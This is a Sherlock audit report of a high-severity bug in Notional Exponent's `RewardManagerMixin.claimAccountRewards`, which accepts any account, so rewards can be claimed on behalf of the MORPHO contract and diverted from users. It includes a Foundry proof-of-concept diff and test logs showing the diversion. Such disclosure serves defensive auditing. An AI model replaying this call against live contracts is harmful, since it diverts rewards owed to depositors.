---
tags:
  - lang/solidity
  - sector/farm
  - sector/lending
  - platform/sherlock
  - has/github
  - has/poc
  - severity/high
  - fix/use-reentrancy-guard
protocol: "[[Notional]]"
auditors:
  - "[[Bluedragon]]"
  - "[[BugsBunny]]"
  - "[[elolpuer]]"
  - "[[jasonxiale]]"
  - "[[patitonar]]"
report: "https://github.com/sherlock-audit/2025-06-notional-exponent-judging"
genome:
  - "[[reward-calculation]]"
  - "[[reward-theft]]"
  - "[[use-reentrancy-guard]]"
  - "[[liquidation-underwater]]"
  - "[[reentrancy-guard]]"
  - "[[reward-accounting]]"
  - "[[timestamp-dependence]]"
---
# H-7: `RewardManagerMixin.claimAccountRewards` lacks of necessary param check.

- id: 62488
- impact: HIGH
- protocol: [[Notional]] Exponent
- reporter: patitonar (Sherlock)
- source: N/A

## Summary


The bug report discusses a vulnerability in the current implementation of the `RewardManagerMixin.claimAccountRewards` function. This function does not check the `account` parameter, meaning that if the address of the `MORPHO` token is passed in, the rewards will be transferred to `MORPHO`. This is incorrect behavior and could result in MORPHO receiving a large portion of the rewards instead of the intended recipient. The root cause of this issue is that the function can be called by anyone and the `account` parameter can be any address. Additionally, when a normal user calls `AbstractLendingRouter.enterPosition` to enter a vault, the vaultToken will be transferred to MORPHO, meaning that if `MORPHO` is passed to `RewardManagerMixin.claimAccountRewards`, it will receive rewards. The impact of this bug is that users may receive less rewards than expected. The protocol team has fixed this issue in a recent PR/commit.

## Details


Source: https://github.com/sherlock-audit/2025-06-notional-exponent-judging/issues/624 

## Found by 
Bluedragon, BugsBunny, elolpuer, jasonxiale, patitonar

### Summary

In current implementation, `RewardManagerMixin.claimAccountRewards` function doesn't check `account` paramm, if the `MORPHO` is passed in as `account`, rewards will be transferred to `MORPHO`. Which isn't correct.


### Root Cause

1. As [RewardManagerMixin.claimAccountRewards](https://github.com/sherlock-audit/2025-06-notional-exponent/blob/82c87105f6b32bb362d7523356f235b5b07509f9/notional-v4/src/rewards/RewardManagerMixin.sol#L155-L177) shows, the function can be called by anyone, and the `account` param can be any address.
2. If the `msg.sender` isn't a lending router, the `sharesHeld` will be calculated by `balanceOf(account)` in [RewardManagerMixin.sol#L160-L164](https://github.com/sherlock-audit/2025-06-notional-exponent/blob/82c87105f6b32bb362d7523356f235b5b07509f9/notional-v4/src/rewards/RewardManagerMixin.sol#L160-L164)
```solidity
155     function claimAccountRewards(
156         address account,
157         uint256 sharesHeld
158     ) external nonReentrant returns (uint256[] memory rewards) {
159         uint256 effectiveSupplyBefore = effectiveSupply();
160         if (!ADDRESS_REGISTRY.isLendingRouter(msg.sender)) {
161             // If the caller is not a lending router we get the shares held in a
162             // native token account.
163             sharesHeld = balanceOf(account);
164         }
...
177     }
```

3. While a normal user calls `AbstractLendingRouter.enterPosition` to enter a vault, the vault will mint vaultToken in [AbstractLendingRouter.sol#L241](https://github.com/sherlock-audit/2025-06-notional-exponent/blob/82c87105f6b32bb362d7523356f235b5b07509f9/notional-v4/src/routers/AbstractLendingRouter.sol#L241), and the vaultToken will be transferred to MORPHO in [AbstractLendingRouter.sol#L244](https://github.com/sherlock-audit/2025-06-notional-exponent/blob/82c87105f6b32bb362d7523356f235b5b07509f9/notional-v4/src/routers/AbstractLendingRouter.sol#L244)
**So after `AbstractLendingRouter.enterPosition`, MORPHO's vaultToken balance will increase**. 

  So if `MORPHO` is passed to `RewardManagerMixin.claimAccountRewards`, it'll get reward tokens, which isn't correct.



### Internal Pre-conditions

None

### External Pre-conditions

None

### Attack Path

The malicious calls `AbstractLendingRouter.enterPosition` with MORPHO address as `account`.

Please apply the following patch in `tests/TestRewardManager.sol` and run
```bash
forge test --mc TestRewardManager --mt test_liquidate_withRewards -vv
[⠑] Compiling...
No files changed, compilation skipped

Ran 1 test for tests/TestRewardManager.sol:TestRewardManager
[PASS] test_liquidate_withRewards() (gas: 1519209)
Logs:
  y.balanceOf                             : 0
  y.balanceOf                             : 50000000000000000000000000000
  y                                       : 0x1d1499e622D69689cdf9004d05Ec547d650Ff211
  rewardToken.balanceOf(MorPho)           : 0
  emissionsToken.balanceOf(MorPho)        : 0
  rewardToken.balanceOf(liquidator)       : 0
  emissionsToken.balanceOf(liquidator)    : 0
  rewardToken.balanceOf(MorPho)           : 119999671233240000000000
  emissionsToken.balanceOf(MorPho)        : 1090909080000000000
  rewardToken.balanceOf(liquidator)       : 0
  emissionsToken.balanceOf(liquidator)    : 454545450000000000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 532.76ms (11.83ms CPU time)

Ran 1 test suite in 628.60ms (532.76ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

As above output shows, MORPHO get rewards, which isn't correct.

```diff
diff --git a/notional-v4/tests/TestRewardManager.sol b/notional-v4/tests/TestRewardManager.sol
index dfdd463..286db0a 100644
--- a/notional-v4/tests/TestRewardManager.sol
+++ b/notional-v4/tests/TestRewardManager.sol
@@ -10,6 +10,7 @@ import "../src/withdraws/GenericERC20.sol";
 import {AbstractRewardManager, RewardPoolStorage} from "../src/rewards/AbstractRewardManager.sol";
 import {RewardManagerMixin} from "../src/rewards/RewardManagerMixin.sol";
 import {ConvexRewardManager} from "../src/rewards/ConvexRewardManager.sol";
+import {console2} from "forge-std/src/console2.sol";

 contract TestRewardManager is TestMorphoYieldStrategy {
     IRewardManager rm;
@@ -337,7 +338,10 @@ contract TestRewardManager is TestMorphoYieldStrategy {
         }
     }

-    function test_liquidate_withRewards(bool hasEmissions, bool hasRewards, bool isPartialLiquidation) public {
+    function test_liquidate_withRewards() public {
+        bool hasEmissions = true;
+        bool hasRewards  = true;
+        bool isPartialLiquidation = true;
         int256 originalPrice = o.latestAnswer();
         address liquidator = makeAddr("liquidator");
         if (hasEmissions) {
@@ -365,7 +369,9 @@ contract TestRewardManager is TestMorphoYieldStrategy {
         asset.approve(address(lendingRouter), type(uint256).max);
         uint256 sharesToLiquidate = isPartialLiquidation ? sharesBefore / 2 : sharesBefore;
         // This should trigger a claim on rewards
+        console2.log("y.balanceOf                             :", y.balanceOf(address(liquidator)));
         uint256 sharesToLiquidator = lendingRouter.liquidate(msg.sender, address(y), sharesToLiquidate, 0);
+        console2.log("y.balanceOf                             :", y.balanceOf(address(liquidator)));
         vm.stopPrank();

         if (hasRewards) assertApproxEqRel(rewardToken.balanceOf(msg.sender), expectedRewards, 0.0001e18, "Liquidated account shares");
@@ -380,21 +386,22 @@ contract TestRewardManager is TestMorphoYieldStrategy {
         if (hasEmissions) vm.warp(block.timestamp + 1 days);
         uint256 emissionsForLiquidator = 1e18 * sharesToLiquidator / y.totalSupply();

+        console2.log("y                                       :", address(y));
+        console2.log("rewardToken.balanceOf(MorPho)           :", rewardToken.balanceOf(address(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb)));
+        console2.log("emissionsToken.balanceOf(MorPho)        :", emissionsToken.balanceOf(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb));
+        console2.log("rewardToken.balanceOf(liquidator)       :", rewardToken.balanceOf(liquidator));
+        console2.log("emissionsToken.balanceOf(liquidator)    :", emissionsToken.balanceOf(liquidator));
         // This second parameter is ignored because we get the balanceOf from
         // the contract itself.
+        vm.startPrank(address(0xa1a2bbccddeeff));
+        RewardManagerMixin(address(rm)).claimAccountRewards(address(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb), type(uint256).max);
+        vm.stopPrank();
         RewardManagerMixin(address(rm)).claimAccountRewards(liquidator, type(uint256).max);

-        uint256 expectedRewardsForLiquidator = hasRewards ? y.convertSharesToYieldToken(sharesToLiquidator) : 0;
-        if (hasRewards) assertApproxEqRel(rewardToken.balanceOf(liquidator), expectedRewardsForLiquidator, 0.0001e18, "Liquidator account rewards");
-        if (hasEmissions) assertApproxEqRel(emissionsToken.balanceOf(liquidator), emissionsForLiquidator, 0.0010e18, "Liquidator account emissions");
-
-        vm.prank(msg.sender);
-        lendingRouter.claimRewards(address(y));
-        uint256 sharesAfterUser = lendingRouter.balanceOfCollateral(msg.sender, address(y));
-        uint256 emissionsForUserAfter = 1e18 * sharesAfterUser / y.totalSupply();
-
-        if (hasRewards) assertApproxEqRel(rewardToken.balanceOf(msg.sender), expectedRewards + expectedRewards - expectedRewardsForLiquidator, 0.0001e18, "Liquidated account rewards");
-        if (hasEmissions) assertApproxEqRel(emissionsToken.balanceOf(msg.sender), emissionsForUser + emissionsForUserAfter, 0.0010e18, "Liquidated account emissions");
+        console2.log("rewardToken.balanceOf(MorPho)           :", rewardToken.balanceOf(address(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb)));
+        console2.log("emissionsToken.balanceOf(MorPho)        :", emissionsToken.balanceOf(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb));
+        console2.log("rewardToken.balanceOf(liquidator)       :", rewardToken.balanceOf(liquidator));
+        console2.log("emissionsToken.balanceOf(liquidator)    :", emissionsToken.balanceOf(liquidator));
     }

     function test_migrate_withRewards(bool hasEmissions, bool hasRewards) public {
@@ -761,4 +768,4 @@ contract TestRewardManager is TestMorphoYieldStrategy {
         assertEq(rewardToken.balanceOf(msg.sender), rewardsBefore1, "User account rewards no change");
     }

-}
\ No newline at end of file
+}
```


### Impact

Becase MORPHO will owns most of vaultToken, most of the rewards will be transferred to MORPHO, leading users get less rewards


### PoC

_No response_

### Mitigation

_No response_

## Discussion

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/notional-finance/notional-v4/pull/16/files
